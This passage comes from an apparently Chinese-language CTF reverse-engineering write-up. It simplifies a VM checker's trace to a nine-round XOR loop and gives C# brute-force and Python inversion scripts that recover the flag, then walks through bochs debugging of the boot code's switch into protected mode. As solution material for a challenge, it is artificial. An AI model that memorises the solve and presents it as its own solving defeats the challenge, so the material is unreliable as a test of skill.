class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">buf[<span class="number">0</span>] = <span class="number">129</span></span><br><span class="line">buf[<span class="number">1</span>] = buf[<span class="number">0</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">buf[<span class="number">1</span>] += buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">3</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '129')</span></span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">1</span>]] <span class="comment"># ('Read code, offset:', '138')</span></span><br><span class="line">buf[<span class="number">3</span>] -= buf[<span class="number">4</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">126</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">3</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 126</span></span><br><span class="line">buf[<span class="number">3</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">1</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">2</span>] -= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">90</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">2</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 90</span></span><br><span class="line">buf[<span class="number">3</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '130')</span></span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">1</span>]] <span class="comment"># ('Read code, offset:', '139')</span></span><br><span class="line">buf[<span class="number">3</span>] -= buf[<span class="number">4</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">126</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">3</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 126</span></span><br><span class="line">buf[<span class="number">3</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">1</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">2</span>] -= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">90</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">2</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 90</span></span><br><span class="line">buf[<span class="number">3</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '131')</span></span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">1</span>]] <span class="comment"># ('Read code, offset:', '140')</span></span><br><span class="line">buf[<span class="number">3</span>] -= buf[<span class="number">4</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">126</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">3</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 126</span></span><br><span class="line">buf[<span class="number">3</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">1</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">2</span>] -= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">90</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">2</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 90</span></span><br><span class="line">buf[<span class="number">3</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '132')</span></span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">1</span>]] <span class="comment"># ('Read code, offset:', '141')</span></span><br><span class="line">buf[<span class="number">3</span>] -= buf[<span class="number">4</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">126</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">3</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 126</span></span><br><span class="line">buf[<span class="number">3</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">1</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">2</span>] -= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">90</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">2</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 90</span></span><br><span class="line">buf[<span class="number">3</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '133')</span></span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">1</span>]] <span class="comment"># ('Read code, offset:', '142')</span></span><br><span class="line">buf[<span class="number">3</span>] -= buf[<span class="number">4</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">126</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">3</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 126</span></span><br><span class="line">buf[<span class="number">3</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">1</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">2</span>] -= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">90</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">2</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 90</span></span><br><span class="line">buf[<span class="number">3</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '134')</span></span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">1</span>]] <span class="comment"># ('Read code, offset:', '143')</span></span><br><span class="line">buf[<span class="number">3</span>] -= buf[<span class="number">4</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">126</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">3</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 126</span></span><br><span class="line">buf[<span class="number">3</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">1</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">2</span>] -= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">90</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">2</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 90</span></span><br><span class="line">buf[<span class="number">3</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '135')</span></span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">1</span>]] <span class="comment"># ('Read code, offset:', '144')</span></span><br><span class="line">buf[<span class="number">3</span>] -= buf[<span class="number">4</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">126</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">3</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 126</span></span><br><span class="line">buf[<span class="number">3</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">1</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">2</span>] -= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">90</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">2</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 90</span></span><br><span class="line">buf[<span class="number">3</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '136')</span></span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">1</span>]] <span class="comment"># ('Read code, offset:', '145')</span></span><br><span class="line">buf[<span class="number">3</span>] -= buf[<span class="number">4</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">126</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">3</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 126</span></span><br><span class="line">buf[<span class="number">3</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">1</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">2</span>] -= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">90</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">2</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 90</span></span><br><span class="line">buf[<span class="number">3</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '137')</span></span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">1</span>]] <span class="comment"># ('Read code, offset:', '146')</span></span><br><span class="line">buf[<span class="number">3</span>] -= buf[<span class="number">4</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">126</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">3</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 126</span></span><br><span class="line">buf[<span class="number">3</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">1</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">2</span>] -= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">90</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">2</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 90</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'right'</span></span><br></pre></td></tr></table></figure><p>人脑逆向机简化一波代码，就是一个 9 次的循环异或，并在最后进行比较：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">129</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    code[i] = code[i] ^ (code[i] &lt;&lt; <span class="number">8</span>) ^ (code[i] &lt;&lt; <span class="number">16</span>) ^ (code[i] &lt;&lt; <span class="number">24</span>) ^ code[i - <span class="number">1</span>] ^ (code[i - <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) ^ (code[i - <span class="number">1</span>] &lt;&lt; <span class="number">16</span>) ^ (code[i - <span class="number">1</span>] &lt;&lt; <span class="number">24</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> i - <span class="number">138</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">if</span> code[<span class="number">138</span> + i] - code[<span class="number">129</span> + i] != <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'wrong'</span></span><br><span class="line">        exit()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'right'</span></span><br></pre></td></tr></table></figure><p>这里已知正确的数据在计算后的结果，可以通过爆破来得到（爆破范围比较大，Python 会消耗很多时间，这里用 C#）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line"></span><br><span class="line">namespace Solve &#123;</span><br><span class="line">class Program &#123;</span><br><span class="line">public static byte[] intToBytes(uint value) &#123;</span><br><span class="line">byte[] res = new byte[4];</span><br><span class="line">res[3] = (byte) ((value &gt;&gt; 24) &amp; 0xFF);</span><br><span class="line">res[2] = (byte) ((value &gt;&gt; 16) &amp; 0xFF);</span><br><span class="line">res[1] = (byte) ((value &gt;&gt; 8) &amp; 0xFF);</span><br><span class="line">res[0] = (byte) (value &amp; 0xFF);</span><br><span class="line">return res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static string asciiToString(byte[] array) &#123;</span><br><span class="line">return Convert.ToString(System.Text.Encoding.ASCII.GetString(array));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void Main(string[] args) &#123;</span><br><span class="line">var data = new uint[] &#123;</span><br><span class="line">0x61646238, 0x36353465, 0x6361352d, 0x31312d38, 0x612d3965, 0x2d316331, 0x39653838, 0x30386566, 0x66616566, 0x57635565, 0x06530401, 0x1f494949, 0x5157071f, 0x575f4357, 0x57435e57, 0x4357020a, 0x575e035e, 0x0f590000, 0x6e6f7277, 0x20202067, 0x00202020, 0x72726f63, 0x20746365, 0x20202020, 0x6c660020, 0x69206761, 0x6c662073, 0x597b6761, 0x5072756f, 0x68637461, 0x2020207d, 0x20202020, 0x20202020, 0x20202020, 0x20202020, 0x20202020, 0x20202020, 0xffffff00, 0xffffffff</span><br><span class="line">&#125;;</span><br><span class="line">var ans = new uint[data.Length];</span><br><span class="line">var patch = new byte[data.Length * 4];</span><br><span class="line">for(uint i = 0; i &lt; 9; i++) &#123;</span><br><span class="line">uint t = 0;</span><br><span class="line">for(uint j = 0; j &lt;= 0x7FFFFFFF; j++) &#123;</span><br><span class="line">t = j ^ (j &lt;&lt; 8) ^ (j &lt;&lt; 16) ^ (j &lt;&lt; 24);</span><br><span class="line">if(i &gt; 0) &#123;</span><br><span class="line">t ^= ans[i - 1] ^ (ans[i - 1] &lt;&lt; 8) ^ (ans[i - 1] &lt;&lt; 16) ^ (ans[i - 1] &lt;&lt; 24);</span><br><span class="line">&#125;</span><br><span class="line">if(t == data[i + 9]) &#123; // 0x57635565</span><br><span class="line">ans[i] = j;</span><br><span class="line">patch[4 * i] = intToBytes(j)[0];</span><br><span class="line">patch[4 * i + 1] = intToBytes(j)[1];</span><br><span class="line">patch[4 * i + 2] = intToBytes(j)[2];</span><br><span class="line">patch[4 * i + 3] = intToBytes(j)[3];</span><br><span class="line">Console.WriteLine(&quot;0x&#123;0:X8&#125;&quot;, j);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">string flag = asciiToString(patch);</span><br><span class="line">Console.WriteLine(flag);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然在已知数据的情况下也可以直接逆回来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">data = [<span class="number">0x57635565</span>, <span class="number">0x06530401</span>, <span class="number">0x1F494949</span>, <span class="number">0x5157071F</span>, <span class="number">0x575F4357</span>, <span class="number">0x57435E57</span>, <span class="number">0x4357020A</span>, <span class="number">0x575E035E</span>, <span class="number">0x0F590000</span>, <span class="number">0x00000000</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    flag += libnum.n2s(data[i] ^ ((data[i] &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xFFFFFFFF</span>))[::<span class="number">-1</span>]</span><br><span class="line">    data[i + <span class="number">1</span>] = data[i] ^ data[i + <span class="number">1</span>]</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="bochs-调试"><a href="#bochs-调试" class="headerlink" title="bochs 调试"></a>bochs 调试</h1><p>这道题其实主要通过 bochs 进行动态调试来分析，下面附上动态调试的一些过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:1&gt; b 0x7c00</span><br><span class="line">&lt;bochs:2&gt; c</span><br><span class="line">00000004662i[BIOS  ] $Revision: 13073 $ $Date: 2017-02-16 22:43:52 +0100 (Do, 16. Feb 2017) $</span><br><span class="line">00000318050i[KBD   ] reset-disable command received</span><br><span class="line">00000320819i[BIOS  ] Starting rombios32</span><br><span class="line">00000321257i[BIOS  ] Shutdown flag 0</span><br><span class="line">00000321840i[BIOS  ] ram_size=0x02000000</span><br><span class="line">00000322261i[BIOS  ] ram_end=32MB</span><br><span class="line">00000362829i[BIOS  ] Found 1 cpu(s)</span><br><span class="line">00000376413i[BIOS  ] bios_table_addr: 0x000f9cd8 end=0x000fcc00</span><br><span class="line">00000704208i[PCI   ] i440FX PMC write to PAM register 59 (TLB Flush)</span><br><span class="line">00001032137i[P2ISA ] PCI IRQ routing: PIRQA# set to 0x0b</span><br><span class="line">00001032156i[P2ISA ] PCI IRQ routing: PIRQB# set to 0x09</span><br><span class="line">00001032175i[P2ISA ] PCI IRQ routing: PIRQC# set to 0x0b</span><br><span class="line">00001032194i[P2ISA ] PCI IRQ routing: PIRQD# set to 0x09</span><br><span class="line">00001032204i[P2ISA ] write: ELCR2 = 0x0a</span><br><span class="line">00001032974i[BIOS  ] PIIX3/PIIX4 init: elcr=00 0a</span><br><span class="line">00001040697i[BIOS  ] PCI: bus=0 devfn=0x00: vendor_id=0x8086 device_id=0x1237 class=0x0600</span><br><span class="line">00001042976i[BIOS  ] PCI: bus=0 devfn=0x08: vendor_id=0x8086 device_id=0x7000 class=0x0601</span><br><span class="line">00001045094i[BIOS  ] PCI: bus=0 devfn=0x09: vendor_id=0x8086 device_id=0x7010 class=0x0101</span><br><span class="line">00001045323i[PIDE  ] new BM-DMA address: 0xc000</span><br><span class="line">00001045939i[BIOS  ] region 4: 0x0000c000</span><br><span class="line">00001047953i[BIOS  ] PCI: bus=0 devfn=0x0a: vendor_id=0x8086 device_id=0x7020 class=0x0c03</span><br><span class="line">00001048157i[UHCI  ] new base address: 0xc020</span><br><span class="line">00001048773i[BIOS  ] region 4: 0x0000c020</span><br><span class="line">00001048901i[UHCI  ] new irq line = 9</span><br><span class="line">00001050796i[BIOS  ] PCI: bus=0 devfn=0x0b: vendor_id=0x8086 device_id=0x7113 class=0x0680</span><br><span class="line">00001051028i[ACPI  ] new irq line = 11</span><br><span class="line">00001051040i[ACPI  ] new irq line = 9</span><br><span class="line">00001051065i[ACPI  ] new PM base address: 0xb000</span><br><span class="line">00001051079i[ACPI  ] new SM base address: 0xb100</span><br><span class="line">00001051107i[PCI   ] setting SMRAM control register to 0x4a</span><br><span class="line">00001215200i[CPU0  ] Enter to System Management Mode</span><br><span class="line">00001215200i[CPU0  ] enter_system_management_mode: temporary disable VMX while in SMM mode</span><br><span class="line">00001215210i[CPU0  ] RSM: Resuming from System Management Mode</span><br><span class="line">00001379231i[PCI   ] setting SMRAM control register to 0x0a</span><br><span class="line">00001394138i[BIOS  ] MP table addr=0x000f9db0 MPC table addr=0x000f9ce0 size=0xc8</span><br><span class="line">00001395960i[BIOS  ] SMBIOS table addr=0x000f9dc0</span><br><span class="line">00001398141i[BIOS  ] ACPI tables: RSDP addr=0x000f9ee0 ACPI DATA addr=0x01ff0000 size=0xf72</span><br><span class="line">00001401353i[BIOS  ] Firmware waking vector 0x1ff00cc</span><br><span class="line">00001403148i[PCI   ] i440FX PMC write to PAM register 59 (TLB Flush)</span><br><span class="line">00001403871i[BIOS  ] bios_table_cur_addr: 0x000f9f04</span><br><span class="line">00001531488i[VBIOS ] VGABios $Id: vgabios.c,v 1.76 2013/02/10 08:07:03 vruppert Exp $</span><br><span class="line">00001531559i[BXVGA ] VBE known Display Interface b0c0</span><br><span class="line">00001531591i[BXVGA ] VBE known Display Interface b0c5</span><br><span class="line">00001534516i[VBIOS ] VBE Bios $Id: vbe.c,v 1.65 2014/07/08 18:02:25 vruppert Exp $</span><br><span class="line">00014040189i[BIOS  ] Booting from 0000:7c00</span><br><span class="line">(0) Breakpoint 1, 0x0000000000007c00 in ?? ()</span><br><span class="line">Next at t=14040244</span><br><span class="line">(0) [0x000000007c00] 0000:7c00 (unk. ctxt): jmpf 0x07c0:0005          ; ea0500c007</span><br></pre></td></tr></table></figure><p>可以用 <code>show mode</code> 命令来显示实模式向保护模式的转换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:3&gt; show mode</span><br><span class="line">show mode switch: ON</span><br><span class="line">show mask is: mode</span><br></pre></td></tr></table></figure><p>利用 <code>u</code> 命令来查看汇编代码，这里是实模式的部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:7&gt; u/40 0x7c00</span><br><span class="line">00007c00: (                    ): jmpf 0x07c0:0005          ; ea0500c007</span><br><span class="line">00007c05: (                    ): mov ax, cs                ; 8cc8</span><br><span class="line">00007c07: (                    ): mov ds, ax                ; 8ed8</span><br><span class="line">00007c09: (                    ): mov ss, ax                ; 8ed0</span><br><span class="line">00007c0b: (                    ): mov sp, 0x0400            ; bc0004</span><br><span class="line">00007c0e: (                    ): cld                       ; fc</span><br><span class="line">00007c0f: (                    ): mov ax, 0x0003            ; b80300</span><br><span class="line">00007c12: (                    ): int 0x10                  ; cd10</span><br><span class="line">00007c14: (                    ): mov dx, 0x0000            ; ba0000</span><br><span class="line">00007c17: (                    ): mov cx, 0x0002            ; b90200</span><br><span class="line">00007c1a: (                    ): mov ax, 0x1000            ; b80010</span><br><span class="line">00007c1d: (                    ): mov es, ax                ; 8ec0</span><br><span class="line">00007c1f: (                    ): xor bx, bx                ; 31db</span><br><span class="line">00007c21: (                    ): mov ax, 0x0228            ; b82802</span><br><span class="line">00007c24: (                    ): int 0x13                  ; cd13</span><br><span class="line">00007c26: (                    ): jnb .+2                   ; 7302</span><br><span class="line">00007c28: (                    ): jmp .-2                   ; ebfe</span><br><span class="line">00007c2a: (                    ): cli                       ; fa</span><br><span class="line">00007c2b: (                    ): mov ax, 0x1000            ; b80010</span><br><span class="line">00007c2e: (                    ): mov ds, ax                ; 8ed8</span><br><span class="line">00007c30: (                    ): xor ax, ax                ; 31c0</span><br><span class="line">00007c32: (                    ): mov es, ax                ; 8ec0</span><br><span class="line">00007c34: (                    ): mov cx, 0x2000            ; b90020</span><br><span class="line">00007c37: (                    ): sub si, si                ; 29f6</span><br><span class="line">00007c39: (                    ): sub di, di                ; 29ff</span><br><span class="line">00007c3b: (                    ): rep movsb byte ptr es:[di], byte ptr ds:[si] ; f3a4</span><br><span class="line">00007c3d: (                    ): mov ax, 0x07c0            ; b8c007</span><br><span class="line">00007c40: (                    ): mov ds, ax                ; 8ed8</span><br><span class="line">00007c42: (                    ): lidt ds:0x006f            ; 0f011e6f00</span><br><span class="line">00007c47: (                    ): lgdt ds:0x0075            ; 0f01167500</span><br><span class="line">00007c4c: (                    ): mov ax, 0x0001            ; b80100</span><br><span class="line">00007c4f: (                    ): lmsw ax                   ; 0f01f0</span><br><span class="line">00007c52: (                    ): jmpf 0x0008:0000          ; ea00000800</span><br></pre></td></tr></table></figure><p>在指令 <code>lmsw ax</code> 处看到实模式向保护模式的转换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:39&gt; n</span><br><span class="line">Next at t=15885325</span><br><span class="line">(0) [0x000000007c4f] 07c0:004f (unk. ctxt): lmsw ax                   ; 0f01f0</span><br><span class="line">&lt;bochs:40&gt;</span><br><span class="line">00015885326: switched from &apos;real mode&apos; to &apos;protected mode&apos;</span><br><span class="line">Next at t=15885326</span><br><span class="line">(0) [0x000000007c52] 07c0:0000000000000052 (unk. ctxt): jmpf 0x0008:0000          ; ea00000800</span><br></pre></td></tr></table></figure><p>保护模式的前一段部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:42&gt; u/20 0x00</span><br><span class="line">00000000: (                    ): mov eax, 0x00000010       ; b810000000</span><br><span class="line">00000005: (                    ): mov ds, ax                ; 8ed8</span><br><span class="line">00000007: (                    ): lss esp, ds:0x00000b5c    ; 0fb2255c0b0000</span><br><span class="line">0000000e: (                    ): call .+120                ; e878000000</span><br><span class="line">00000013: (                    ): call .+107                ; e86b000000</span><br><span class="line">00000018: (                    ): mov eax, 0x00000010       ; b810000000</span><br><span class="line">0000001d: (                    ): mov ds, ax                ; 8ed8</span><br><span class="line">0000001f: (                    ): mov es, ax                ; 8ec0</span><br><span class="line">00000021: (                    ): mov fs, ax                ; 8ee0</span><br><span class="line">00000023: (                    ): mov gs, ax                ; 8ee8</span><br><span class="line">00000025: (                    ): lss esp, ds:0x00000b5c    ; 0fb2255c0b0000</span><br><span class="line">0000002c: (                    ): xor ebx, ebx              ; 31db</span><br></pre></td></tr></table></figure><p>IDTR 的初始化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:39&gt; 